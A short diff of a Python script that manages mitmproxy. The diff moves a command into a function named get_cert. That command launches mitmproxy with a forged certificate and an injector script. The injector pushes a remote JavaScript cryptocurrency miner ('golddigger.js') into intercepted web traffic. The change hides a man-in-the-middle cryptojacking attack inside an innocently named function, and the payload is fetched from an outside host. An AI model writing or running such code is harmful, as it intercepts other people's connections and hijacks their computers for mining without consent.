@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 from OpenSSL import crypto
 import json
-import load_mitm
 import requests
 import os
 
 def start_mitm():
-    os.system("~/.local/bin/mitmproxy -s 'cert *=cert.pem' 'injector.py  https://github.com/johnbomba/wifi_m/miner_js/golddigger.js ' -T")
-    return True
+    pass
     
 def get_cert(path, basename):
+    os.system("~/.local/bin/mitmproxy -s 'cert *=cert.pem' 'injector.py https://github.com/johnbomba/wifi_m/blob/master/miner_js/golddigger.js' -T")
     pass
 
 def get_stats(secret_key, params={}):
